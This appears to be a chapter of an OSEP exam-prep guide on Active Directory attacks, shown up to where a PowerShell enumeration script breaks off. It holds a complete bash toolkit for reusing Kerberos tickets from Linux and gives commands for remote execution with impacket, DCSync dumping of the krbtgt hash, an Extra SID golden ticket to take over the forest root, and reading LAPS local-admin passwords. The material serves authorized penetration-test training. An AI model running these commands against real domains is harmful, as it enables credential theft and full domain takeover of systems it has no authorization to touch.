::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 12 · AD Attacks: Tickets, Delegation, LAPS, Trust and ADCS (Scenarios 47, 49–55)

> **Prerequisites:** follow [00-environment-and-infra](/modules/00-environment-and-infra) to set up the attack machine directory, listeners and delivery. Shared placeholders: `LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD URL`.
>
> Textbook basis and cheat sheet mapping (hereafter CS): scenario 47 <- C5/textbook §19.3; 49 <- C1; 50 <- C1/textbook ch. 21, 23; 51 <- C5/textbook ch. 21, 23; 52 <- textbook ch. 21, 23; 53 <- C5/textbook ch. 21; 54 <- textbook §22.2.1; 55 <- textbook §22.2.2. CS sections: `AD Enumeration` (~L7768), `AD Attacking` (~L8251, containing Unconstrained Delegation L8253 / Golden Tickets L8394 / LAPS L8460), `Kerberos` (~L7071).

**Cross-cutting principle**: 80% of this module's work happens on the Kali attack machine (impacket suite + certipy); only "inducing authentication / capturing tickets" has to happen on the target Windows host. Write down "where the ticket comes from, which service it is for, and whose identity it carries" before you touch anything - if the ticket points the wrong way, a perfect command is still useless.

| Scenario | One-line goal | Scripts used |
|---|---|---|
| 47 | Linux holds a ticket -> Windows service | `m12-kerberos-tickets-linux.sh` |
| 49 | Read LAPS -> execute as local administrator | `m12-ad-enum-windows.ps1` / `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
| 50 | Unconstrained delegation captures a DC TGT -> DCSync | `m12-delegation-attacks.ps1` |
| 51 | RBCD: write `AllowedToAct` -> impersonate an administrator | `m12-delegation-attacks.ps1` |
| 52 | Constrained delegation S4U -> target SPN service | `m12-delegation-attacks.ps1` |
| 53 | Subdomain -> forest root (trust check + Extra SID) | `m12-ad-enum-linux.sh` + `m12-laps-and-trust-notes.md` |
| 54 | ESC1 template -> certificate authentication | `m12-adcs-esc1-esc8.sh` |
| 55 | ESC8 HTTP enrollment relay | `m12-adcs-esc1-esc8.sh` |

---

## Scenario 47: You already have a domain ticket on Linux, but you need to reach a Windows service

**Situation**: You control a domain-joined Linux host with a valid, usable credential cache (ccache) or keytab; the next hop is a service in the Windows domain (SMB/WinRM/HTTP), and you have no cleartext password.

**Assumptions**: The Linux clock is within 5 minutes of the DC (hard Kerberos requirement - compare with `date` first); the attack machine can reach TCP/UDP 88 on the DC and 445/5985 on the target; you know `DOMAIN` (FQDN, correct case) plus the DC hostname/IP. Note: key distribution must use the **all-lowercase domain name**, and the target must be reached by the **FQDN that matches the SPN** (never by IP).

**Prepare (attacker side)**:
```bash
export KRB5CCNAME=/home/kali/osep/tickets/current.ccache   # session-level; every -k tool reads it
klist -e          # show whose ticket is in the cache and its enctype (rc4/aes decides whether the DC accepts it)
# kirbi (Rubeus) -> ccache conversion; keytab -> kinit is in m12-kerberos-tickets-linux.sh
```
The minimal `/etc/krb5.conf` template plus `/etc/hosts` (`DC01.corp.local` and the `TARGET` FQDN must both resolve) are in `m12-kerberos-tickets-linux.sh`.

**Procedure**:
```bash
# 1) Authenticate directly with the TGT/TGS (-k reads KRB5CCNAME, -no-pass stops asking for a password)
smbclient -k -L //WS02.corp.local
impacket-wmiexec -k -no-pass DOMAIN/USER@WS02.corp.local     # needs the cifs/WS02 TGS; the tool requests it automatically
impacket-secretsdump -k -no-pass DC01.corp.local             # needs the DC machine ticket; first confirm whose it is
evil-winrm -i ws02.corp.local -k                             # the Kerberos path needs wsman/WS02
# 2) The ticket's identity has no access to the target service -> use the existing ticket to request another service's TGS
#    (the key only has to be in the cache; no password needed again. See the ask_tgs function in the script)
```
**Scripts used**: `m12-kerberos-tickets-linux.sh` (ccache/keytab use, format conversion, krb5.conf template, requesting a TGS per service).

**Validation**: `smbclient -k -L //WS02` lists shares / `wmiexec` returns a shell = pass; `klist` shows the newly issued TGS. If you get `KRB_AP_ERR_MODIFIED`, it is usually a mismatch between the ticket principal and the SPN or enctype, not a network problem.

**Failure branches and alternatives**:
- There is a ticket in the cache but the target is unreachable -> (1) check that the target FQDN matches the SPN (`smbclient -k -L //WS02` vs `//ws02.corp.local`); (2) your ticket principal may be denied by that service's ACL -> switch service (if WinRM is closed, use SMB).
- The KDC reports an unsupported enctype -> in `/etc/krb5.conf`, add `rc4-hmac` to `default_tkt_enctypes/default_tgs_enctypes`, or add `aes256-cts-hmac-sha1-96`, so the list matches what the DC supports.
- Clock skew error (`Clock skew too great`) -> `sudo ntpdate DC01` or fix the clock manually; the skew must stay under 5 minutes.
- The Windows service sits on an internal segment (target only reachable from inside) -> set up port forwarding/Ligolo first ([08-pivoting-tunneling](/modules/08-pivoting-tunneling)), **do Kerberos after the tunnel is up**, and remember that every machine on the forwarding path must also reach the DC on port 88.

**Exam / OPSEC notes**: Verify the ticket identity with something harmless first (`smbclient -L`) before reaching for execution tools; store ccache files per session (`~/osep/tickets/`) so a domain A ticket is never used against domain B; every `-k` tool reads `KRB5CCNAME`, so switching tickets requires an explicit `export`, and confirm with `klist` right before the command.

---

#### `m12-kerberos-tickets-linux.sh` {#m12-kerberos-tickets-linux-sh}

````bash
#!/usr/bin/env bash
# =============================================================================
# Purpose: Linux-side Kerberos ticket workbench - start from an existing ccache / keytab / kirbi,
#       inspect tickets, convert formats, request TGT/TGS, and use -k to hit Windows services
#       (smbclient / wmiexec / psexec / smbexec / secretsdump / evil-winrm),
#       plus a minimal working template for /etc/krb5.conf and /etc/hosts·resolv.
# Scenario: M12 scenario 47 (domain ticket already on Linux, need to reach a Windows service);
#       also serves 50/51/52/53 (how to use the tickets once you have them to land on Windows).
# Dependencies: krb5-user (klist / kinit / kvno / ktutil, Kali: sudo apt install -y krb5-user);
#       impacket (impacket-ticketConverter / -getTGT / -getST / -wmiexec / -psexec /
#       -smbexec / -secretsdump, Kali: sudo apt install -y impacket-scripts);
#       smbclient (samba client); evil-winrm (gem install evil-winrm, optional);
#       when a tool is missing, print a clear error plus an install hint instead of exiting silently.
# Usage: ./m12-kerberos-tickets-linux.sh -m info -c ~/osep/tickets/current.ccache
#       ./m12-kerberos-tickets-linux.sh -m krb5conf -d corp.local -s DC01.corp.local -o /tmp/krb5.conf
#       ./m12-kerberos-tickets-linux.sh -m convert -T dc.kirbi -o dc.ccache
#       ./m12-kerberos-tickets-linux.sh -m auth -d corp.local -s DC01.corp.local -t WS02.corp.local
#       ./m12-kerberos-tickets-linux.sh -m tgs -S cifs/WS02.corp.local -d corp.local
# Placeholders (all passed in as arguments; no real values are hardcoded in the script):
#   DOMAIN = domain FQDN (-d, e.g. corp.local; REALM is uppercased automatically to CORP.LOCAL)
#   TARGET = DC/target host (-s / -t, e.g. DC01.corp.local, WS02.corp.local)
#   USER / PASS / NTHASH = for cases that need a password/hash (-u / -p / -H)
#   LHOST = attack machine IP (only used when -i passes the DC/CA IP, for the hosts template)
# Test status: not exercised against a real domain; local bash -n passes. Execution modes print commands by default;
#           add -x to actually run them (so unverified commands never hit the exam environment directly).
# Differences from docs/12-ad-attacks.md:
#   1) The doc folds kirbi->ccache and keytab->kinit into this script; the implementation splits them into convert /
#      keytab modes with -T/-o and -k/-u respectively, matching the behaviour described in the doc.
#   2) The doc does not give a concrete command for requesting a TGS per service; the tgs mode fills that in (kvno and
#      impacket-getST, two paths), matching the doc line 'see the ask_tgs function in the script'.
#   3) The cross-domain (subdomain->forest root) steps are documented in scenario 53; this script offers a cross mode
#      to bridge them, while the golden ticket commands themselves live in m12-laps-and-trust-notes.md.
# =============================================================================
set -u

MODE="info"
DOMAIN=""       # -d  domain FQDN
DC=""           # -s  DC host FQDN
TGT_HOST=""     # -t  target Windows host FQDN
USER=""         # -u
PASS=""         # -p
NTHASH=""       # -H
CCACHE=""       # -c  ccache path
KEYTAB=""       # -k  keytab path
TICKET=""       # -T  ticket to convert (kirbi / ccache)
OUTFILE=""      # -o  output file
SPN=""          # -S  service SPN
DCIP=""         # -i  DC/target IP (hosts template only)
EXEC=0          # -x  actually execute (default: print only)
TICKET_DIR="$HOME/osep/tickets"

usage() {
    sed -n '2,32p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

Arguments:
  -m <mode>   job mode (default info):
       info      show the current KRB5CCNAME and ticket contents (klist -e) + clock-skew self-check
       krb5conf  generate a minimal /etc/krb5.conf template (-o names the output path; prints by default)
       hosts     generate resolution templates for /etc/hosts and resolv (Kerberos cannot use IP)
       kinit     get a TGT with a cleartext password (kinit USER@REALM)
       keytab    build a keytab with ktutil and kinit with it (needs -u and -p)
       convert   kirbi <-> ccache conversion (impacket-ticketConverter, needs -T and -o)
       tgt       get a TGT with a password/hash (impacket-getTGT, needs -u and -p or -H)
       tgs       request a TGS per service (kvno; or impacket-getST -spn, needs -S)
       auth      hit Windows services with an existing ticket: the full smbclient/wmiexec/psexec/smbexec/
                 secretsdump/evil-winrm -k command set (needs -d and -t)
       cross     print the Linux -> Windows cross-domain (subdomain->forest root) steps and prerequisites
       all       info + krb5conf + hosts + auth (cold-start one-shot)
  -d <fqdn>   domain FQDN (DOMAIN), required for most modes
  -s <host>   DC host FQDN (TARGET)
  -t <host>   target Windows host FQDN (TARGET), required for auth mode
  -u <user>   username (USER)
  -p <pass>   cleartext password (PASS)
  -H <hash>   NTHASH (used by impacket)
  -c <path>   ccache path (overrides KRB5CCNAME)
  -k <path>   keytab path
  -T <path>   ticket file to convert (.kirbi / .ccache)
  -o <path>   output file (for krb5conf / keytab / convert / tgt)
  -S <spn>    service SPN, e.g. cifs/WS02.corp.local (tgs mode)
  -i <ip>     IP of the DC or target (LHOST same-subnet form; only the hosts template uses it)
  -x          actually execute commands (default is print only - check before you run)
  -h          this help

exit codes: 0 ok / 1 argument or dependency error
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }

# Print a command line: single-quote only the arguments containing spaces/quotes so the output is copy-pasteable
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

# Print (or execute) one command: print first, then run it when -x is set; a missing command gives a readable hint
run() {
    printable "$@"
    if [ "$EXEC" != "1" ]; then return 0; fi
    if ! have "$1"; then
        err "Missing command: $1 (Kali: sudo apt install -y krb5-user impacket-scripts samba-client)"
        return 0
    fi
    "$@" || err "The previous command returned non-zero: work through the output above (ticket principal/SPN/enctype/time)"
    return 0
}

while getopts "m:d:s:t:u:p:H:c:k:T:o:S:i:xh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        t) TGT_HOST="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        c) CCACHE="$OPTARG" ;;
        k) KEYTAB="$OPTARG" ;;
        T) TICKET="$OPTARG" ;;
        o) OUTFILE="$OPTARG" ;;
        S) SPN="$OPTARG" ;;
        i) DCIP="$OPTARG" ;;
        x) EXEC=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# REALM is always uppercase (Kerberos requirement)
REALM=""
if [ -n "$DOMAIN" ]; then
    REALM="$(printf '%s' "$DOMAIN" | tr '[:lower:]' '[:upper:]')"
fi

# ccache default and export: every -k tool reads KRB5CCNAME
if [ -n "$CCACHE" ]; then
    KRB5CCNAME="$CCACHE"
    export KRB5CCNAME
elif [ -n "${KRB5CCNAME:-}" ]; then
    CCACHE="$KRB5CCNAME"
else
    CCACHE="$TICKET_DIR/current.ccache"
fi

require_mode_arg() {
    local missing=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            DOMAIN) [ -z "$DOMAIN" ] && missing="$missing -d" ;;
            DC)     [ -z "$DC" ]     && missing="$missing -s" ;;
            TARGET) [ -z "$TGT_HOST" ] && missing="$missing -t" ;;
            USER)   [ -z "$USER" ]   && missing="$missing -u" ;;
            PASS)   [ -z "$PASS" ]   && missing="$missing -p" ;;
            SPN)    [ -z "$SPN" ]    && missing="$missing -S" ;;
            TICKET) [ -z "$TICKET" ] && missing="$missing -T" ;;
            OUTFILE)[ -z "$OUTFILE" ] && missing="$missing -o" ;;
        esac
        shift
    done
    if [ -n "$missing" ]; then
        err "Mode -m $MODE is missing required arguments: $missing"
        err "(use -h to see which arguments each mode needs)"
        exit 1
    fi
}

# ---------------------------------------------------------------------------
mode_info() {
    head_ "Ticket and session self-check (info)"
    info "KRB5CCNAME = ${KRB5CCNAME:-(not set; tools fall back to /tmp/krb5cc_UID)}"
    info "Session-level export: export KRB5CCNAME=$CCACHE"
    if [ ! -f "$CCACHE" ]; then
        err "ccache file does not exist: ${CCACHE} (produce one with convert/tgt/kinit first, or point -c at the right path)"
    fi
    run klist -e
    echo
    info "Clock-skew check (Kerberos requires <5 minutes from the DC):"
    run date
    if [ -n "$DC" ]; then
        info "Compare DC time: nc -vz $DC 445 must succeed before you continue; fix with: sudo ntpdate $DC"
        info "(if ntpdate is unavailable: sudo rdate -n $DC or date -s 'YYYY-MM-DD HH:MM:SS')"
    else
        info "Pass -s DC01.corp.local to also print the DC time comparison and the correction command"
    fi
    echo
    info "Common readings:"
    info "  - Default principal in klist decides who you are, and therefore which services you can reach"
    info "  - etypes rc4-hmac / aes256-cts-hmac-sha1-96 are accepted by most DCs"
    info "  - KRB_AP_ERR_MODIFIED usually means the ticket principal does not match the SPN or enctype, not a network fault"
    info "  - Clock skew too great means the clock drifted; fix the time and retry"
}

# ---------------------------------------------------------------------------
mode_krb5conf() {
    require_mode_arg DOMAIN DC
    head_ "Minimal /etc/krb5.conf template (krb5conf)"
    local conf
    conf="$(cat <<EOF
[libdefaults]
    default_realm = $REALM
    dns_lookup_kdc = false
    dns_lookup_realm = false
    # Match the DC's supported set: old environments only accept rc4-hmac, new ones commonly use aes256
    default_tkt_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tgs_enctypes = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    permitted_enctypes  = rc4-hmac aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    udp_preference_limit = 1
    kdc_timesync = 1
    ccache_type = 4
    rdns = false
    ticket_lifetime = 24h
    renew_lifetime = 7d
    forwardable = true

[realms]
    $REALM = {
        kdc = $DC
        admin_server = $DC
        default_domain = $DOMAIN
    }

[domain_realm]
    .$DOMAIN = $REALM
    $DOMAIN = $REALM
EOF
)"
    printf '%s\n' "$conf"
    if [ -n "$OUTFILE" ]; then
        printf '%s\n' "$conf" > "$OUTFILE" \
            && info "Written: ${OUTFILE} (activate with: sudo cp $OUTFILE /etc/krb5.conf)" \
            || err "Write failed: ${OUTFILE} (read-only? try -o /tmp/krb5.conf)"
    else
        info "To persist: add -o /tmp/krb5.conf then sudo cp /tmp/krb5.conf /etc/krb5.conf"
        info "Back up before copying: sudo cp /etc/krb5.conf /etc/krb5.conf.bak"
    fi
    echo
    info "On an enctype error (KDC has no support for encryption type): trim the unneeded etypes down to"
    info "rc4-hmac only and retry; or go the other way and add aes256-cts-hmac-sha1-96."
}

# ---------------------------------------------------------------------------
mode_hosts() {
    require_mode_arg DOMAIN DC
    head_ "Name resolution template (hosts) - Kerberos requires FQDNs, never a direct IP"
    local ip1="$DCIP"
    [ -z "$ip1" ] && ip1="TARGET"
    echo "# append to /etc/hosts (replace TARGET with the real IP; the FQDN must be spelled exactly as in the SPN)"
    echo "$ip1    $DC    ${DC%%.*}"
    if [ -n "$TGT_HOST" ]; then
        echo "TARGET    $TGT_HOST    ${TGT_HOST%%.*}"
    fi
    echo
    echo "# how to append (needs root)"
    echo "sudo sh -c 'echo \"$ip1    $DC    ${DC%%.*}\" >> /etc/hosts'"
    if [ -n "$TGT_HOST" ]; then
        echo "sudo sh -c 'echo \"TARGET    $TGT_HOST    ${TGT_HOST%%.*}\" >> /etc/hosts'"
    fi
    echo
    info "Using the domain DNS instead of hosts (cleaner):"
    echo "sudo sh -c 'echo \"nameserver TARGET\" > /etc/resolv.conf'   # replace TARGET with the DC's IP first"
    echo "# or ad hoc: dig @TARGET $DC +short  to verify the lookup returns the right IP"
    echo
    info "Verify: getent hosts $DC should return an IP; ping failing does not matter as long as resolution is right and 88/445 are reachable"
    info "Note: /etc/hosts must carry both the FQDN and the short name, otherwise some tools cannot build the SPN"
}

# ---------------------------------------------------------------------------
mode_kinit() {
    require_mode_arg DOMAIN USER PASS
    head_ "Get a TGT with a cleartext password (kinit)"
    info "REALM must be uppercase: $REALM"
    run kinit "$USER@$REALM"
    echo
    info "Tip: paste PASS at the password prompt; or (lab only) printf 'PASS' | kinit $USER@$REALM"
    run klist -e
    echo
    info "Renew: kinit -R (while the ticket is still inside its renew window)"
}

# ---------------------------------------------------------------------------
mode_keytab() {
    require_mode_arg DOMAIN USER PASS
    local kt="$OUTFILE"
    [ -z "$kt" ] && kt="$TICKET_DIR/$USER.keytab"
    head_ "Mint a ticket from a keytab (keytab) -> $kt"
    echo "# ktutil interactive steps (non-interactive equivalent below)"
    echo "ktutil"
    echo "  addent -password -p $USER@$REALM -k 1 -e rc4-hmac"
    echo "  wkt $kt"
    echo "  quit"
    echo
    echo "kinit $USER@$REALM -k -t $kt"
    echo "klist -e"
    echo
    info "Non-interactive form (the script feeds printf into ktutil):"
    echo "printf 'addent -password -p %s@%s -k 1 -e rc4-hmac\\n%s\\nwkt %s\\nquit\\n' \\" "$USER" "$REALM" "PASS" "$kt"
    echo "  | ktutil"
    echo
    info "ktutil's -e must match an enctype the DC supports; rc4-hmac has the best compatibility."
    info "After building the keytab remember: kinit to produce the ccache before export KRB5CCNAME=$CCACHE."
    mkdir -p "$TICKET_DIR" 2>/dev/null || true
}

# ---------------------------------------------------------------------------
mode_convert() {
    require_mode_arg TICKET
    local out="$OUTFILE"
    [ -z "$out" ] && out="${TICKET%.*}.ccache"
    head_ "Ticket format conversion (convert): $TICKET -> $out"
    case "$TICKET" in
        *.kirbi|*.kirby)
            info "kirbi (Rubeus/mimikatz export) -> ccache"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
        *.ccache)
            info "ccache -> kirbi (for Windows-side Rubeus / mimikatz ptt)"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
        *.txt|*.b64)
            info "base64 TGT text (Rubeus monitor output) -> save it to a file first, then convert:"
            echo "base64 -d $TICKET > ${TICKET%.*}.kirbi"
            run impacket-ticketConverter "${TICKET%.*}.kirbi" "$out"
            ;;
        *)
            err "Cannot tell the ticket type from the extension: ${TICKET} (supported: .kirbi / .ccache / .txt)"
            err "Pass -o to name the output explicitly; the script still goes through impacket-ticketConverter"
            run impacket-ticketConverter "$TICKET" "$out"
            ;;
    esac
    echo
    info "After converting: export KRB5CCNAME=$out then klist -e to confirm the principal (e.g. DC01\$)"
    info "Rubeus-side base64 -> file caveat: the base64 string must be a single line, do not drag log timestamps into it"
}

# ---------------------------------------------------------------------------
mode_tgt() {
    require_mode_arg DOMAIN DC USER
    if [ -z "$PASS" ] && [ -z "$NTHASH" ]; then
        err "tgt mode needs -p PASS or -H NTHASH"; exit 1
    fi
    local out="$OUTFILE"
    [ -z "$out" ] && out="$TICKET_DIR/$USER.ccache"
    head_ "Get a TGT (impacket-getTGT) -> $out"
    if [ -n "$NTHASH" ]; then
        run impacket-getTGT -dc-ip "$DC" -hashes ":$NTHASH" "$DOMAIN/$USER"
    else
        run impacket-getTGT -dc-ip "$DC" "$DOMAIN/$USER:$PASS"
    fi
    echo
    info "getTGT writes USER.ccache into the current directory by default; mv it into the ticket directory before using -o:"
    echo "mv $USER.ccache $out && export KRB5CCNAME=$out && klist -e"
    info "(impacket-getTGT has no -o; the output name is fixed to <username>.ccache)"
}

# ---------------------------------------------------------------------------
mode_tgs() {
    require_mode_arg SPN
    head_ "Request a TGS per service (tgs): $SPN"
    info "Path one (a TGT is already in the cache; cleanest): kvno - ask the KDC for a service ticket using the existing ticket"
    run kvno "$SPN"
    echo
    info "Path two (use impacket-getST when RBCD/constrained delegation needs S4U; requires service account credentials)"
    if [ -n "$USER" ]; then
        local cred="$DOMAIN/$USER"
        [ -n "$PASS" ] && cred="$cred:$PASS"
        run impacket-getST -spn "$SPN" -dc-ip "$DC" "$cred"
    else
        echo "impacket-getST -spn $SPN -impersonate USER -dc-ip TARGET 'DOMAIN/SVC:PASS'"
    fi
    echo
    run klist -e
    info "Once the $SPN service ticket shows up in klist, use -m auth to reach the matching service."
}

# ---------------------------------------------------------------------------
mode_auth() {
    require_mode_arg DOMAIN TARGET
    head_ "Hit Windows services with an existing ticket (auth) - all -k -no-pass"
    info "Prerequisite: export KRB5CCNAME=$CCACHE   then klist -e to confirm which principal is on the ticket"
    local u="$USER"
    [ -z "$u" ] && u="USER"     # with no -u we print the placeholder; whoever is on the ticket is who you act as
    echo
    echo "# 1) Read-only validation (do this first; only reach for execution tools once the ticket identity is enough)"
    run smbclient -k -L "//$TGT_HOST"
    echo
    echo "# 2) Needs a cifs/TARGET TGS (the tool requests it automatically)"
    run impacket-wmiexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    run impacket-smbexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    run impacket-psexec -k -no-pass "$DOMAIN/$u@$TGT_HOST"
    echo
    echo "# 3) DCSync (the ticket principal must be a DC machine account or hold replication rights)"
    [ -z "$DC" ] && DC="$TGT_HOST"
    run impacket-secretsdump -k -no-pass "$DC"
    run impacket-secretsdump -k -no-pass -just-dc-user krbtgt "$DC"
    echo
    echo "# 4) WinRM (needs a wsman/TARGET TGS)"
    run evil-winrm -i "$TGT_HOST" -r "$DOMAIN" -k
    echo
    info "If you have no -k but do have a domain user password/hash (for comparison):"
    echo "impacket-wmiexec $DOMAIN/USER@$TGT_HOST -hashes :NTHASH"
    echo
    info "Failure branches:"
    info "  - smbclient reports KRB_AP_ERR_MODIFIED -> check the FQDN matches the SPN (no short name, no IP)"
    info "  - KDC reports an unsupported enctype -> change enctypes in /etc/krb5.conf (see -m krb5conf)"
    info "  · Clock skew -> sudo ntpdate $DC"
    info "  - Target reachable only from the internal segment -> forward the port first / Ligolo (docs/08), Kerberos after that,"
    info "    and every machine on the forwarding path must also reach port 88 on the DC"
}

# ---------------------------------------------------------------------------
mode_cross() {
    head_ "Linux -> Windows cross-domain steps (cross, bridge to scenario 53)"
    info "1) Confirm which domain the current ticket belongs to: klist -e (the suffix of Default principal is the domain)"
    run klist -e
    echo
    info "2) Lateral movement inside the same domain: just use -m auth (-d takes the subdomain FQDN, -t a host FQDN in that subdomain)"
    echo
    info "3) Subdomain -> forest root: an Extra SID golden ticket only comes into play when the forest parent-child trust exists and SID filtering is off."
    info "   The checks and the full commands are in m12-laps-and-trust-notes.md; the core three steps:"
    echo "   impacket-ticketer -nthash <subdomain krbtgt NT hash> -domain child.$DOMAIN \\"
    echo "       -domain-sid <subdomain SID> -extra-sid '<root domain SID>-519' Administrator"
    echo "   export KRB5CCNAME=Administrator.ccache"
    echo "   impacket-secretsdump -k -no-pass <root DC FQDN>"
    echo
    info "4) /etc/hosts must resolve both the subdomain DC FQDN and the root DC FQDN (generate with -m hosts)"
    info "5) If the trust is external/forest-wide (SID filtering on) -> Extra SID is useless; go back to enumeration for another entry point."
}

# ---------------------------------------------------------------------------
case "$MODE" in
    info)     mode_info ;;
    krb5conf) mode_krb5conf ;;
    hosts)    mode_hosts ;;
    kinit)    mode_kinit ;;
    keytab)   mode_keytab ;;
    convert)  mode_convert ;;
    tgt)      mode_tgt ;;
    tgs)      mode_tgs ;;
    auth)     mode_auth ;;
    cross)    mode_cross ;;
    all)      mode_info; mode_krb5conf; mode_hosts; mode_auth ;;
    *)        err "Unknown mode: $MODE"; usage ;;
esac

printf '\n[*] Mode %s finished. Commands are printed by default; add -x to actually run them.\n' "$MODE"
info "Next: get a ticket -> refine with -m convert/tgs -> land it with -m auth; for cross-domain see -m cross."
````

## Scenario 49: No local privilege escalation path, but the current domain user can read LAPS

**Situation**: The initial session is a plain domain user; there is no local privilege escalation on this host; but the directory ACL allows reading the local administrator password (LAPS) of **another machine**. Goal: execute remotely as that machine's local administrator.

**Assumptions**: The target domain has LAPS deployed and the current user can read the password attribute (deployment usually grants read to Domain Users, or you obtained it via ACL/GenericRead); the LAPS password is the password of the **target machine's local Administrator**, not a domain user. First work out whether the target uses **legacy LAPS (AdmPwd, attribute `ms-Mcs-AdmPwd*`)** or **Windows LAPS (attribute `msLAPS-Password*`)** - the two are queried differently.

**Prepare (attacker side)**: Confirm you can query LDAP (`ldapsearch` or impacket); prepare remote-execution templates (target has 445 -> `wmiexec/psexec`; only 5985 -> WinRM). **Windows-side** query script: `m12-ad-enum-windows.ps1`.

**Procedure**:
```bash
# Attack machine (Linux) reads the attributes straight over LDAP - first probe which LAPS version is present (query both attributes)
ldapsearch -x -H ldap://DC01.corp.local -D "CORP\\USER" -w 'PASS' \
  -b "DC=corp,DC=local" "(objectClass=computer)" \
  ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword
# Execute remotely once you have the cleartext
impacket-wmiexec CORP/Administrator@WS02.corp.local -hashes :NTHASH   # or -p 'password'
```
Windows side (session host): `m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`; a quick reference for both versions is in `m12-laps-and-trust-notes.md`.

**Scripts used**: `m12-ad-enum-windows.ps1` (both LAPS versions + enumeration), `m12-ad-enum-linux.sh` (bulk LDAP enumeration including LAPS attributes), `m12-laps-and-trust-notes.md` (command quick reference).

**Validation**: The password you read gets you into WS02 with `wmiexec`/`psexec`; if the password looks right but will not work, first confirm it belongs to WS02 (LAPS passwords are per-machine), then confirm the remote-execution protocol is open.

**Failure branches and alternatives**:
- Attribute empty / unreadable -> (1) the machine may not have LAPS enabled or the password has not been rotated yet - enumerate other machines (query the whole domain at once with `(ms-Mcs-AdmPwd=*)`); (2) the current user genuinely lacks read access -> use another entry point from this module (RBCD/delegation/certificate) to escalate to an identity that can read it.
- Windows LAPS stores `msLAPS-EncryptedPassword` (an encrypted value) -> reading cleartext requires `Get-LapsADPassword` (decryption is done with the target machine's key) or the LAPS module on the DC; when plain LDAP cannot get cleartext, **do not keep hammering it** - switch to a machine in `msLAPS-Password` cleartext mode, or fall back to a legacy LAPS machine.
- WinRM open but SMB closed -> use `evil-winrm`; both closed -> the LAPS password is useless, go back to enumeration for another entry point.

**Exam / OPSEC notes**: LAPS queries generate LDAP audit entries; that is expected enumeration behaviour, but do not dump every password in the domain and then try them one by one - only touch the machines the scenario actually needs. Do not echo the password into a long command that stays readable in shell history (use an environment variable or a script parameter).

---

#### `m12-ad-enum-windows.ps1` {#m12-ad-enum-windows-ps1}

````powershell
<#
Purpose: pure ADSI / .NET domain enumeration (no RSAT ActiveDirectory module and no
      PowerView) - domain info and MAQ, users, groups and privileged group members, computers, SPN (Kerberoast
      candidates), the three delegation attributes, an ACL summary for a given object, and both LAPS versions with a readability verdict.
Scenario: M12 scenario 49 (read LAPS), 51 (RBCD prerequisite: find a computer object with a writable/editable delegation attribute),
      52 (confirm the service account's msDS-AllowedToDelegateTo and the target SPN), 50 (find an unconstrained host).
      Same job as m12-ad-enum-linux.sh, implemented for both Linux and Windows.
Dependencies: Windows PowerShell 2.0+ ships System.DirectoryServices (DirectoryEntry /
      DirectorySearcher) and System.Security.Principal; no administrator rights needed (and no write operations).
      Prefer giving -Domain explicitly as the domain FQDN; otherwise the current computer's domain is used.
Usage: .\m12-ad-enum-windows.ps1 -Mode All
      .\m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02
      .\m12-ad-enum-windows.ps1 -Mode Delegation
      .\m12-ad-enum-windows.ps1 -Mode ACL -AclTarget "CN=WS02,CN=Computers,DC=corp,DC=local"
      .\m12-ad-enum-windows.ps1 -Mode Users -MaxResults 50 -Domain corp.local
Placeholders: DOMAIN=domain FQDN (corp.local) TARGET=domain name/hostname (WS02) USER=domain username
      PASS=password (this script only reads and enumerates, so no credentials are needed; PASS only shows up in the follow-up commands it prints)
      - replace the placeholders above with the real values of the exam environment before running; no real values are hardcoded in the script.
Test status: not exercised in a Windows domain; bracket/quote pairing was checked locally and the logic follows the ADSI
      standard usage (equivalent to the commands in the cheat sheet 'AD Enumeration / LDAP' section).
Differences from docs/12-ad-attacks.md:
  1) The doc writes `-Mode LAPS -ComputerName WS02`: here -ComputerName may or may not carry the trailing
     `$` (both WS02 and WS02$ are accepted); omitting -ComputerName enumerates every LAPS-enabled machine in the domain.
  2) The doc describes an 'ACL summary'; this script's ACL mode only **reads** and highlights high-risk permissions
     (GenericAll/GenericWrite/WriteDacl/WriteOwner/ExtendedRight) and changes nothing;
     **writing** delegation attributes belongs to m12-delegation-attacks.ps1 (RBCD mode).
  3) The doc lists neither SPN/MAQ nor privileged groups; they are added here so scenarios 51/52 can use them directly.
#>
[CmdletBinding()]
param(
    [ValidateSet('All','Domain','Users','Groups','Computers','SPN','Delegation','ACL','LAPS','Help')]
    [string]$Mode = 'All',
    [string]$ComputerName = '',        # LAPS mode: a single machine (TARGET), with or without the trailing $
    [string]$Domain = '',              # DOMAIN: domain FQDN, blank = current domain
    [string]$SearchRoot = '',          # override the search root DN, blank = defaultNamingContext
    [string]$AclTarget = '',           # ACL mode: target object DN, blank = domain root
    [int]$MaxResults = 0,              # 0 = unlimited, >0 truncates output (try 50 first on a large domain)
    [switch]$Help
)

$ErrorActionPreference = 'Continue'

# ---------------------------------------------------------------------------
# Basics: search root / domain SID / generic searcher
# ---------------------------------------------------------------------------
$script:RootPath = ''
$script:DomainSID = ''
